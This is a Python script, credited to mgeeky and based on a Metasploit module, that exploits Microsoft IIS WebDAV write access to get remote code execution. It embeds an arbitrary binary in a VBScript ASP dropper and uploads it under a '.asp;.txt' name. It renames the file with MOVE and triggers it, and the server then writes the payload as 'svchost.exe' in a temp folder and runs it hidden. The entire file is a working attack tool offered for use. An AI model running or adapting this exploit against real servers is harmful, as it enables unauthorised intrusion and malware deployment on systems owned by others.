#!/usr/bin/python

import requests
import string
import random
import sys


def randstring(N = 6):
  return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(N))

if __name__ == '__main__':
  if len(sys.argv) != 3:
    print 'Usage: webdav_upload.py <host> <inputfile>'
    sys.exit(0)

  sc = ''
  with open(sys.argv[2], 'rb') as f:
      bytes = f.read()
      sc = 'sc = Chr(%d)' % ord(bytes[0])
      for i in range(1, len(bytes)):
          if i % 100 == 0:
              sc += '\r\nsc = sc'
          sc += '&Chr(%d)' % ord(bytes[i])
          
  put_request = '''<%% @language="VBScript" %%>
<%% 
    Sub webdav_upload()
        Dim fs
        Set fs = CreateObject("Scripting.FileSystemObject")
        Dim str
        Dim tmp
        Dim tmpexe
        Dim sc
        %(shellcode)s
        Dim base
        Set tmp = fs.GetSpecialFolder(2)
        base = tmp & "\" & fs.GetTempName()
        fs.CreateFolder(base)
        tmpexe = base & "\" & "svchost.exe"
        Set str = fs.CreateTextFile(tmpexe, 2, 0)
        str.Write sc
        str.Close
        Dim shell
        Set shell = CreateObject("Wscript.Shell")
        shell.run tmpexe, 0, false
    End Sub

    webdav_upload
%%>''' % {'shellcode' : sc}

  print '\n\tMicrosoft IIS WebDAV Write Code Execution exploit'
  print '\t(based on Metasploit HDM\'s <iis_webdav_upload_asp> implementation)'
  print '\tMariusz Banach / mgeeky, 2016\n'

  host = sys.argv[1]
  if not host.startswith('http'):
    host = 'http://' + host
  outname = '/file' + randstring(6) + '.asp;.txt'

  print 'Step 0: Checking if file already exist: "%s"' % (host + outname)
  r = requests.get(host + outname)
  if r.status_code == requests.codes.ok:
    print 'Resource already exists. Exiting...'
    sys.exit(1)
  else:
    print '[*] File does not exists. That\'s good.'

  print '\nStep 1: Upload file with improper name: "%s"' % (host + outname)
  print '\tSending %d bytes, this will take a while. Hold tight Captain!' % len(put_request)

  r = requests.request('put', host + outname, data=put_request, headers={'Content-Type':'application/octet-stream'})

  if r.status_code < 200 or r.status_code >= 300:
    print '[!] Upload failed. Status: ' + str(r.status_code)
    sys.exit(1)
  else:
    print '[+] File uploaded.'

  newname = outname.replace(';.txt', '')
  print '\nStep 2: Moving file from: "%s" to "%s"' % (outname, newname)

  r = requests.request('move', host + outname, headers={'Destination':newname})

  if r.status_code < 200 or r.status_code >= 300:
    print '[!] Renaming operation failed. Status: ' + str(r.status_code)
    sys.exit(1)
  else:
    print '[+] File renamed, splendid my lord.'

  print '\nStep 3: Executing resulted payload file (%s).' % (host + newname)
  r = requests.get(host + newname)

  if r.status_code < 200 or r.status_code >= 300:
    print '[!] Execution failed. Status: ' + str(r.status_code)
    print '[!] Response: ' + r.text
    sys.exit(1)
  else:
    print '[+] File has been launched. Game over.'
